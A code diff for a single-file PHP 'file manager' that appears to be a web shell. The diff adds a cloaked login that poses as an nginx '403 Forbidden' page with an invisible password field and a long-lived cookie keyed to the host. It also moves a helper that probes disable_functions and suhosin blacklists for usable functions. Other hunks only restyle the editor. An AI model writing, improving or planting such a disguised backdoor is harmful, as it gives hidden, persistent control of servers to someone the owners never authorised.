@@ -1,68 +1,29 @@
 <?php
-/**
- * Nothings — Secure File Manager (single-file, legacy-friendly) + Login Protection
- * Compatibility: PHP 5.x → latest
- */
 
-// ==========================================
-// CONFIG: mmq lo
-// ==========================================
-$auth_pass = "6f6f30d8f9e1397d26524a99e8c97aaa0e7c2df62dbd4f3b55735e5edc91e86a";
+$auth_pass = '$2y$12$fkOCJdGpv6xhEU6A131oDOICv5koMMgj95ISmFJUCiP8rI/Y9aGqa';
 
-if (!function_exists('is_fn_usable')) {
-    function is_fn_usable($fn) {
-        if (!function_exists($fn)) return false;
-
-        $disabled = (string) @ini_get('disable_functions');
-        $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist');
-
-        $blocked = array();
-        if ($disabled !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
-        if ($suhosin  !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
-
-        if (!empty($blocked)) {
-            $blocked = array_filter(array_map('strtolower', $blocked));
-            if (in_array(strtolower($fn), $blocked, true)) return false;
-        }
-        return true;
-    }
+function Login() {
+  die("<html>
+  <title>403 Forbidden</title>
+  <center><h1>403 Forbidden</h1></center>
+  <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
+  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
 }
 
-date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : 'UTC');
-session_start();
-
-if (empty($_SESSION['csrf'])) {
-    $_SESSION['csrf'] = bin2hex(biru_random_bytes(16));
-}
-
-// ==========================================
-// LOGIN & SESSION HANDLING (Fixed loop bug)
-// ==========================================
-function renderLoginPage() {
-    die("<html>
-    <head><title>403 Forbidden</title></head>
-    <body>
-    <center><h1>403 Forbidden</h1></center>
-    <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
-    <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>
-    </body>
-    </html>");
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v, time() + 86400 * 30, "/");
 }
 
 if (!empty($auth_pass)) {
-    // Jika user mengirimkan password via POST
-    if (isset($_POST['pass'])) {
-        if (hash('sha256', $_POST['pass']) === $auth_pass) {
-            $_SESSION['auth_logged'] = true;
-        } else {
-            // Jika password salah, langsung tampilkan halaman login lagi
-            renderLoginPage();
-        }
+    
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $auth_pass)) {
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), md5($auth_pass));
     }
 
-    // Periksa status login di Session
-    if (empty($_SESSION['auth_logged']) || $_SESSION['auth_logged'] !== true) {
-        renderLoginPage();
+    
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != md5($auth_pass))) {
+        Login();
     }
 }
 
@@ -75,6 +36,21 @@ header('Pragma: no-cache');
 header('Expires: 0');
 
 /* ---------- Util & Polyfills ---------- */
+if (!function_exists('is_fn_usable')) {
+    function is_fn_usable($fn) {
+        if (!function_exists($fn)) return false;
+        $disabled = (string) @ini_get('disable_functions');
+        $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist');
+        $blocked = array();
+        if ($disabled !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
+        if ($suhosin  !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
+        if (!empty($blocked)) {
+            $blocked = array_filter(array_map('strtolower', $blocked));
+            if (in_array(strtolower($fn), $blocked, true)) return false;
+        }
+        return true;
+    }
+}
 function h($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 
 if (!function_exists('je')) {
@@ -678,7 +654,9 @@ $yearNow = date('Y');
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
   <style>
-    .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
+    textarea { background-color: #0b1220 !important; color: #f8fafc !important; }
+    .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220 !important; color:#f8fafc !important; }
+    .CodeMirror-lines, .CodeMirror-line { color: #f8fafc !important; }
     .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }
     html,body{height:100%}
     body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
@@ -842,9 +820,9 @@ $yearNow = date('Y');
               <input type="hidden" name="file" value="<?php echo h(basename($editFile)); ?>">
               <input type="hidden" name="mode" value="<?php echo h($viewMode); ?>">
               <?php if ($viewMode === 'txt'): ?>
-                <textarea id="editor" name="content"><?php echo h($display); ?></textarea>
+                <textarea id="editor" name="content" class="w-full h-80 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100 outline-none" spellcheck="false"><?php echo h($display); ?></textarea>
               <?php else: ?>
-                <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php echo h($display); ?></textarea>
+                <textarea name="content" class="w-full h-80 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100 outline-none" spellcheck="false"><?php echo h($display); ?></textarea>
               <?php endif; ?>
               <div class="mt-3 flex flex-wrap gap-2 items-center">
                 <button class="btn btnw" type="submit">Save</button>
@@ -1043,6 +1021,16 @@ $yearNow = date('Y');
     </div>
   </footer>
   <script>
+    if (document.getElementById('editor') && typeof CodeMirror !== 'undefined') {
+      try {
+        var cm = CodeMirror.fromTextArea(document.getElementById('editor'), {
+          lineNumbers: true,
+          theme: 'material-darker',
+          lineWrapping: true
+        });
+        cm.on('change', function(instance) { instance.save(); });
+      } catch(e) {}
+    }
     function filterRows(){
       const q = (document.getElementById('searchBox').value || '').toLowerCase();
       document.querySelectorAll('#dirBody tr').forEach(r => {
